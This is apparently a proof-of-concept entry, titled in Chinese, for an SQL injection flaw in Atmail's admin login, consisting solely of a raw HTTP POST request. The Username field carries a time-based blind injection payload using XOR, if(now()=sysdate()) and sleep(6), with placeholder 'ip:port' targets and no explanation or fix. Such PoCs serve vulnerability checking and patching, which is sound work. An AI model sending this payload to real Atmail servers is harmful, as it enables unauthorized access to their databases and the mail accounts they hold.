# Atmail存在SQL注入漏洞



## poc

```java
POST /index.php/admin/index/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://ip:port/
Content-Length: 153
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Host: ip:port
Connection: Keep-alive

Language=ca&Password=1&Username=admin'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&login=1&send=1&server=https://ip:port/
```

